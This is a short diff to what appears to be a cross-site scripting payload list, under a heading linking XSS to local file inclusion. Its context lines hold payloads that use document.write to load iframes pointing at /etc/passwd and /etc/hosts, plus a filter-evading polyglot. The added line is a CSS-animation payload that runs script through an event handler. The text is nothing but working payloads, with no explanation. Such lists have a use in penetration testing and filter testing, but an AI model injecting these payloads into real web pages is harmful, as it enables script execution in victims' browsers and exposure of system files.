@@ -21,3 +21,4 @@ XSS => LFI
 <script>document.write(%27<iframe%20src=file://///etc/hosts></iframe>%27);</script>
 <img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+"<zzz><style>@keyframes+x+{}</style><xss+style="animation-Name:+x"+onwebkitanimationstart="print()"></xss>
